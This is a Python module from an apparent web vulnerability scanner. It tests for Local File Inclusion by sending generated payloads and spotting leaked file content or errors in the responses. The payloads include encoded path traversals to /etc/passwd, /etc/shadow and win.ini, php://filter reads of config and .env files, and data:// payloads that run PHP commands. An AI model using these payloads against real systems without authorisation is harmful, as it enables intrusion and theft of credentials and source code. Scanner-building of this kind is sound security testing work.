"""Local File Inclusion checker — differential content detection with smart payloads.

Combines path traversal, wrappers (php://, file://, data://), and encoding
bypass techniques for comprehensive LFI detection.
"""

import re
from typing import Optional, List

import httpx

from webscanner.checkers.base import BaseChecker
from webscanner.core.models import CheckResult, BaselineData


class LFI(BaseChecker):

    name = "Local File Inclusion (LFI)"

    def __init__(self, max_depth: int = 8):
        self.max_depth = max_depth
        self.payloads_list = self._build_payloads()

        # Patterns that indicate LFI success (file content leaked)
        self._hit_patterns = [
            # /etc/passwd
            re.compile(r"root:x:0:0:", re.M),
            re.compile(r"[a-z_]+:[x*]:(\d+):(\d+):", re.M),
            # /etc/hosts
            re.compile(r"\b127\.0\.0\.1\b.*localhost", re.I),
            # /proc/self/environ
            re.compile(r"(APACHE|NGINX|HTTP|PATH)_", re.I),
            # Shell paths
            re.compile(r"/bin/(bash|sh|zsh|dash)\b"),
            # Windows win.ini
            re.compile(r"^\[fonts\]", re.I | re.M),
            re.compile(r"for 16-bit app support", re.I),
            # Linux version
            re.compile(r"Linux version \d+\.\d+", re.M),
            # PHP filter base64 blob (long base64 string = file content)
            re.compile(r"^[A-Za-z0-9+/]{100,}={0,2}$", re.M),
            # phpinfo() output from data:// wrapper
            re.compile(r"phpinfo\(\)|PHP Version", re.I),
            # /etc/shadow (rare but critical)
            re.compile(r"root:\$[0-9a-z]+\$", re.I | re.M),
            # /proc/version
            re.compile(r"Linux version \d+\.\d+\.\d+", re.M),
        ]

        # Error patterns indicating path traversal is being processed
        self._err_patterns = [
            re.compile(r"failed to open stream", re.I),
            re.compile(r"No such file or directory", re.I),
            re.compile(r"open_basedir restriction", re.I),
            re.compile(r"Warning:\s*(?:include|require|fopen|file_get_contents)", re.I),
        ]

    def get_payloads(self) -> List[str]:
        return self.payloads_list

    def check(self, baseline: BaselineData, response: httpx.Response, payload: str) -> Optional[CheckResult]:
        body = response.text or ""

        # ── 1. Content-based (differential): pattern NOT in baseline, YES in injected ──
        for rx in self._hit_patterns:
            if rx.search(body) and not rx.search(baseline.body):
                return CheckResult(
                    vuln_name=self.name,
                    severity="critical",
                    confidence="confirmed",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"File content detected: {rx.pattern[:50]}",
                )

        # ── 2. Error-based (differential): error NOT in baseline, YES in injected ──
        for rx in self._err_patterns:
            if rx.search(body) and not rx.search(baseline.body):
                return CheckResult(
                    vuln_name=self.name,
                    severity="medium",
                    confidence="tentative",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"Path traversal error: {rx.pattern[:50]}",
                )

        return None

    # ── payload generation ──────────────────────────────────────

    def _build_payloads(self) -> List[str]:
        out: list[str] = []

        # ── Target files ────────────────────────────────────────
        unix_targets = [
            "etc/passwd", "etc/hosts", "etc/shadow",
            "proc/self/environ", "proc/version",
        ]
        win_targets = ["Windows/win.ini", "boot.ini"]

        # ── Traversal prefixes ──────────────────────────────────
        # Each is a single "../" equivalent using different encodings
        traversals = [
            "../",
            "..%2f",
            "%2e%2e/",
            "%2e%2e%2f",
            "..%252f",      # double-encoded
            "..%c0%af",     # overlong UTF-8
            "..\\",
            "..%5c",
            "..%255c",      # double-encoded backslash
            "..././",       # bypass naive "../" strip filter
            "....//",       # bypass recursive strip
        ]

        # ── 1. Classic path traversal (raw + encoded) ───────────
        for depth in range(1, self.max_depth + 1):
            for trav in traversals:
                prefix = trav * depth
                for target in unix_targets:
                    out.append(prefix + target)
                for target in win_targets:
                    out.append(prefix + target)
                    out.append(prefix + target.replace("/", "\\"))

        # ── 2. Absolute paths ───────────────────────────────────
        for target in unix_targets:
            out.append(f"/{target}")

        # ── 3. file:// wrapper + traversal ──────────────────────
        for target in unix_targets:
            out.append(f"file:///{target}")
        out.append("file://C:/Windows/win.ini")

        for depth in [3, 5, 8]:
            trav = "../" * depth
            for target in unix_targets:
                out.append(f"file://{trav}{target}")

        # ── 4. php://filter wrapper + traversal ─────────────────
        # Base64 encode to exfiltrate source code
        php_filter_targets = [
            "index.php", "config.php", "wp-config.php",
            "application/config/database.php",
            ".env",
        ]
        # php://filter on static relative targets
        for target in php_filter_targets:
            out.append(f"php://filter/convert.base64-encode/resource={target}")

        # php://filter with traversal to reach files outside webroot
        for depth in [1, 2, 3, 5]:
            trav = "../" * depth
            for target in php_filter_targets:
                out.append(f"php://filter/convert.base64-encode/resource={trav}{target}")

            # php://filter on system files (base64 encoded content)
            for target in unix_targets:
                out.append(f"php://filter/convert.base64-encode/resource={trav}{target}")
                out.append(f"php://filter/read=string.rot13/resource={trav}{target}")

        # Absolute path via php://filter
        for target in unix_targets:
            out.append(f"php://filter/convert.base64-encode/resource=/{target}")
            out.append(f"php://filter/read=string.rot13/resource=/{target}")

        # ── 5. php://input and data:// wrappers ─────────────────
        # data:// wrapper for RCE via file include
        out.append("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==")   # <?php phpinfo(); ?>
        out.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==") # <?php system('id'); ?>

        # ── 6. Null-byte injection (legacy PHP < 5.3.4) ─────────
        for depth in [3, 5, 8]:
            trav = "../" * depth
            for target in unix_targets:
                out.append(f"{trav}{target}%00")
                out.append(f"{trav}{target}\x00")

        # ── 7. Double-encoding traversal to system files ────────
        double_enc_targets = ["etc/passwd", "etc/hosts"]
        for depth in [3, 5, 8]:
            trav_de = "..%252f" * depth
            for target in double_enc_targets:
                out.append(trav_de + target)

        # ── Deduplicate preserving order ────────────────────────
        seen = set()
        unique = []
        for p in out:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        return unique
